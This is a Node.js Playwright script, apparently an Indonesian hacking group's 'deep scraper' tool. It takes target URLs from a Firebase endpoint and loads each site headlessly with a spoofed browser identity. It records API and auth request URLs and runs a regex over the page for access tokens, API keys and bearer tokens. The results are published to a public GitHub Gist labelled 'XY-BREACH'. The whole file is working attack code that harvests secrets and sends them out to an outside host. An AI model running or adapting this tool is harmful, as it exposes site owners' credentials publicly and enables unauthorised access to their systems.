const { chromium } = require('playwright');
const axios = require('axios');

// KONFIGURASI XY-SYSTEMS
const FIREBASE_URL = "https://kall-e4441-default-rtdb.asia-southeast1.firebasedatabase.app/scraper/request.json";
const GITHUB_TOKEN = process.env.XY_GIST_TOKEN; // Ambil dari Github Secrets

async function runDeepScraper() {
    console.log(" [XY] INITIATING DEEP PENETRATION...");
    
    let browser;
    try {
        // 1. Ambil Perintah dari Firebase
        const { data: request } = await axios.get(FIREBASE_URL);
        if (!request || !request.target) {
            return console.log(" [!] NO TARGET SIGNAL DETECTED.");
        }

        console.log(` [>] LOCKING TARGET: ${request.target}`);

        // 2. Launch Ganas Browser (Playwright)
        browser = await chromium.launch({ headless: true });
        const context = await browser.newContext({
            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            viewport: { width: 1280, height: 720 }
        });
        const page = await context.newPage();

        // 3. Network Sniffing (Mencegat API tersembunyi)
        const treasures = {
            api_endpoints: [],
            detected_tokens: [],
            meta: {
                target: request.target,
                description: request.desc || "No Description",
                timestamp: new Date().toLocaleString(),
                author: "PoweredBy Kall & XyTeam"
            }
        };

        page.on('request', req => {
            const url = req.url();
            // Filter: Hanya ambil yang berbau API/Data, abaikan gambar/font/css
            if (url.match(/api|v1|graphql|json|auth|token|sign/i) && !url.match(/\.(png|jpg|woff|css|svg)/i)) {
                treasures.api_endpoints.push(url);
            }
        });

        // 4. Breach Target
        await page.goto(request.target, { waitUntil: 'networkidle', timeout: 60000 });

        // --- TRIK GACOR: AUTO SCROLL (Biar API aslinya kepanggil) ---
        console.log(" [>] PERFORMING DEEP SCAN (AUTO-SCROLLING)...");
        await page.evaluate(async () => {
            await new Promise((resolve) => {
                let totalHeight = 0;
                let distance = 150;
                let timer = setInterval(() => {
                    let scrollHeight = document.body.scrollHeight;
                    window.scrollBy(0, distance);
                    totalHeight += distance;
                    if (totalHeight >= scrollHeight || totalHeight > 10000) {
                        clearInterval(timer);
                        resolve();
                    }
                }, 100);
            });
        });

        // Tunggu sebentar untuk eksekusi script terakhir
        await page.waitForTimeout(5000);

        // 5. Mining Tokens dari Rendered HTML
        const bodyHTML = await page.content();
        const tokenRegex = /(?:accessToken|auth_token|api_key|token|bearer)["']\s*[:=]\s*["']([^"']+)["']/gi;
        const foundTokens = bodyHTML.match(tokenRegex);
        if (foundTokens) {
            treasures.detected_tokens = [...new Set(foundTokens)]; // Remove duplicates
        }

        // 6. Push ke Gist (Harta Karun Utama)
        if (GITHUB_TOKEN) {
            console.log(" [>] SYNCING TO GITHUB GIST...");
            const domain = new URL(request.target).hostname;
            await axios.post('https://api.github.com/gists', {
                description: `XY-BREACH: ${domain} | ${request.desc || ''}`,
                public: true,
                files: {
                    [`${domain}_report.json`]: {
                        content: JSON.stringify(treasures, null, 4)
                    }
                }
            }, {
                headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
            });
            console.log(" [OK] DATA SECURED IN GIST VAULT.");
        } else {
            console.log(" [!] GITHUB_TOKEN MISSING. CHECK YOUR SECRETS!");
        }

    } catch (err) {
        console.error(` [ERR] BREACH FAILED: ${err.message}`);
    } finally {
        if (browser) await browser.close();
        console.log(" [SYS] AGENT WITHDRAWN.");
        process.exit(0);
    }
}

runDeepScraper();
